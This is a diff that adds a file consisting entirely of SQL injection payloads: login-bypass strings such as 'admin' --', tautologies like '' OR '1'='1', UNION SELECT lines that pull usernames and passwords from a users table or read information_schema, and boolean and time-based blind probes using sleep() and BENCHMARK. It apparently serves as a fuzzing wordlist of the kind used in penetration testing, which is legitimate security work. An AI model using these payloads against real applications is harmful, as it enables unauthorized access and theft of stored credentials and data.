@@ -1,0 +1,102 @@
+' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+admin' --
+admin' #
+admin'/*
+' or 'a'='a
+') or ('a'='a
+' OR '1'='1
+' or 1=1 limit 1 --
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+' OR 1=1; --
+" OR 1=1 --
+" OR 1=1#
+" OR 1=1/*
+admin" --
+admin" #
+admin"/*
+" or "a"="a
+") or ("a"="a
+" OR "1"="1
+" or 1=1 limit 1 --
+" OR "1"="1" --
+" OR "1"="1" #
+" OR "1"="1"/*
+" OR 1=1; --
+or 1=1--
+' OR '1'='1' AND ''='
+' OR ''='
+' or 1=1 --
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1'--
+') or ('1'='1')--
+' or 1=1-- -
+' OR EXISTS(SELECT * FROM users) --
+' OR 1=1 ORDER BY 1--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username, password FROM users--
+' UNION SELECT 1,username,password FROM users--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT null,null--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT table_name, column_name FROM information_schema.columns--
+' AND 1=2 UNION SELECT null,null--
+' AND 1=2 UNION SELECT username,password FROM users--
+1' AND '1' = '1
+1' AND '1' = '2
+1" AND "1" = "1
+1" AND "1" = "2
+' and 1=1--
+' and 1=2--
+" and 1=1--
+" and 1=2--
+or true--
+or false--
+' OR TRUE--
+" OR TRUE--
+' or '' = '
+' or 1=1 and ''='
+' or sleep(5)--
+' OR BENCHMARK(10000000,MD5('1'))--
+1 OR SLEEP(5)--
+1 OR 1=1
+1 AND 1=1
+1 AND 1=2
+' OR 1=1 LIMIT 1 --
+' OR 'a'='a
+" OR "a"="a
+' or 1=1-- -
+' or 1=1--+
+' or 1=1-- -
+' or 1=1# 
+' or 1=1/*
+' or 1=1--" 
+" or 1=1--"
+' OR 'x'='x
+" OR "x"="x
+') OR ('x'='x
+') OR ('x'='x')--
+') OR 'x'='x')--
+') OR 'x'='x')-- -
+admin' or '1'='1
+admin' or 1=1 --
+admin' or 1=1/*
+admin' -- -
+admin' #
+' OR 1=1; --
+' OR '1'='1'; --
+1' OR '1' = '1
+1' OR '1' = '2
+' OR 1=1 LIMIT 1 OFFSET 0 --
+' OR 1=1 LIMIT 1 OFFSET 1 --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL --
+' UNION SELECT version() --
+' UNION SELECT user() --
